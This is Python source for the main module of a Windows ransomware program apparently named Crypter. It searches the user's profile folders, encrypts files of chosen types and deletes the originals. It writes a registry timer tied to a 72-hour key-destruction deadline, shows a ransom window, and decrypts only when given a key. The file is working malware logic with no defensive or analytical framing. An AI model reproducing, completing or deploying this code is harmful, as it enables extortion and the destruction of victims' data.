## RANSOM
## Main Script
## author mls
# todo Adjust dialogs to only allow one instance open at a time
# todo Disable OK and Canel buttons on decryption AS SOON as OK is hit and decryption starts

'''
@done:
- Adjusted decrypt files button to disable once the key has been destoryed
- Adjusted view encrypted files button to load a default messages if the list file was not found
- Successful decryption now also disables the OK button, prevent a re-decryption
    + It also disables the "Enter Decryption Key" button on the Main Menu
- Implemented method to delete the timer registry key foillowing successful decrpytin
'''

# Import libs
import os
import sys
import win32api
import winerror
import win32event
import _winreg
import wx
import time

# Import classes
import Crypt
import Base
import Gui


################
## Main Class ##
################
class Main(Base.Base):
  # Class to create a main object for the program
  
  # Class Variables
  KEY_DESTRUCT_TIME_SECONDS = 259200
  REGISTRY_LOCATION = r"SOFTWARE\\Crypter"
  REGISTRY_CONTEXT = _winreg.HKEY_CURRENT_USER


  def __init__(self, action, decrypt_key):
    # Init Object
    self.encrypted_file_list = os.path.join(os.environ['APPDATA'], "encrypted_files.txt")

    # Init Crypt Lib
    if decrypt_key and action == "decrypt":
      self.Crypt = Crypt.SymmetricCrypto(decrypt_key)
    else:
      self.Crypt = Crypt.SymmetricCrypto()

    # handle action
    if action == "encrypt" and not os.path.isfile(self.encrypted_file_list):
      file_list = self.find_files()
      # Start encryption
      self.encrypt_files(file_list)
      # Present GUI
      self.start_gui()
    # IF already encrypted
    elif action == "encrypt" and os.path.isfile(self.encrypted_file_list):
      self.start_gui()
    elif action == "decrypt":
      # Start decryption
      self.decrypt_files()
      
      
  def get_start_time(self):
    # Function to get the start time from the registry, or create a new entry for it
    
    # Try to open registry key
    try:
      reg = _winreg.OpenKeyEx(self.REGISTRY_CONTEXT, self.REGISTRY_LOCATION)
      start_time = _winreg.QueryValueEx(reg, "")[0]
      _winreg.CloseKey(reg)
    # If failure, create the key
    except WindowsError:
      start_time = int(time.time())
      reg = _winreg.CreateKey(self.REGISTRY_CONTEXT, self.REGISTRY_LOCATION)
      _winreg.SetValue(reg, "", _winreg.REG_SZ, str(start_time))
      _winreg.CloseKey(reg)
        
    return start_time    

  def cleanup(self):
    # To be called once decryption has finished. Cleans up the system
    
    self.delete_encrypted_file_list()
    self.delete_registry_entries()

  def delete_registry_entries(self):
    # Function to delete the timer registry keyo
    
    # Open and delete the key
    reg = _winreg.OpenKeyEx(self.REGISTRY_CONTEXT, self.REGISTRY_LOCATION)
    _winreg.DeleteKeyEx(reg, "")
    _winreg.CloseKey(reg)
    
      
  def start_gui(self):
    # Function to open to GUI
    
    # Get Crypter start_time
    start_time = self.get_start_time()
    
    app = wx.App()
    #sys._MEIPASS = "..\\..\\build_script\\images"
    crypter_gui = Gui.MyFrame1(None, 
                               sys._MEIPASS, 
                               self.KEY_DESTRUCT_TIME_SECONDS, 
                               start_time,
                               self.encrypted_file_list,
                               self)
                               
    crypter_gui.Show()
    app.MainLoop()
    
  def get_encrypted_file_list(self):
    # Function to return the list of encrypted files

    # Get list of encrypted files
    try:
      with open(self.encrypted_file_list) as fh:
        file_list = fh.readlines()
      fh.close()
    except IOError:
      raise Exception("A list of encrypted files was not found at: %s" % self.encrypted_file_list)
  
    return file_list

      

  def decrypt_file(self, encrypted_file):
    # Function to decrypt a file
    # To be called and iterated via GUI
    # TODO Once decrypted, delete the registry key entry

    # Decrypt!
    if not encrypted_file:
      return

    # IF successful decryption, delete locked file
    locked_path = self.Crypt.decrypt_file(encrypted_file.rstrip())
    if locked_path:
      os.remove(locked_path)
      
      
  def delete_encrypted_file_list(self):
    # Function to delete the list of encrypted files

    # Remove encrypted file list
    os.remove(self.encrypted_file_list)


  def encrypt_files(self, file_list):
    # Function to encrypt the provided files
    encrypted_files = []

    # Encrypt them and add to list if successful
    for file in file_list:

      # Encrypt file if less than specified file size
      if int(os.path.getsize(file)) < self.MAX_FILE_SIZE_BYTES:
        is_encrypted = self.Crypt.encrypt_file(file)
      else:
        is_encrypted = False

      # IF encrypted, try to delete the file and add to the list
      if is_encrypted:
        try:
          os.remove(file)
        # Ignore any exception, such as access denied, and continue
        except:
          continue
        encrypted_files.append(file)

    # Write out list of encrypted files
    if encrypted_files:
      fh = open(self.encrypted_file_list, "w")
      for encrypted_file in encrypted_files:
        fh.write(encrypted_file)
        fh.write("\n")
      fh.close()
      

  def find_files(self):
    # Function to find the relevant files to encrypt and return a list
    base_dirs = self.get_base_dirs(os.environ['USERPROFILE'])
    file_list = []

    for directory in base_dirs:
      for path,subdirs,files in os.walk(directory):
        for file in files:
          if os.path.isfile(os.path.join(path, file)):
            # Check extension is valid
            if self.is_valid_filetype(file):
              file_list.append(os.path.join(path, file))
        for file in subdirs:
          if os.path.isfile(os.path.join(path, file)):
            if self.is_valid_filetype(file):
              file_list.append(os.path.join(path, file))



    return file_list


  def is_valid_filetype(self, file):
    # Function to validate that the file extension is valid

    # Split filename
    components = file.split(".")

    # If no extension, return False
    if len(components) <= 1:
      return False

    # Get extension and check if valid
    extension = components[-1]
    if extension in self.FILETYPES:
      return True
    else:
      return False


  def set_wallpaper(self):
    # Function to set the ransom wallpaper
    # FUNCTION NOW OBSOLETE: No longer chaning desktop wallpaper

    # Import image and write to path
    # todo adjust file name... maybe replace this with whatever is provided in the config file?
    image_path = os.path.join(sys._MEIPASS, "ransom.png")

    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, image_path, 3)


if __name__ == "__main__":

  # Parse any arguments
  args_list = sys.argv
  # Check for decrypt
  for x in args_list:
    if x == "-d" or x == "--decrypt":
      action = "decrypt"
      break
    else:
      action = "encrypt"

  # Check for key
  for x in range(len(args_list)):
    if (args_list[x] == "-k" or args_list[x] == "--key") and (action == "decrypt"):
      try:
        if len(args_list[x+1]) == 32:
          key = args_list[x+1]
          break
        else:
          key = None
          break
      except IndexError:
        key = None
        break
    else:
      # Exit if decrypting and key has not been provided
      key = None

  # START
  if action == "decrypt" and key is None:
    sys.exit()
  else:

    # Now try to create mutex
    mutex = win32event.CreateMutex(None, 1, "mutex_rr_windows")
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
      mutex = None
      sys.exit()

    # Otherwise run
    else:
      ransom = Main(action, key)
      # Delete the mutex

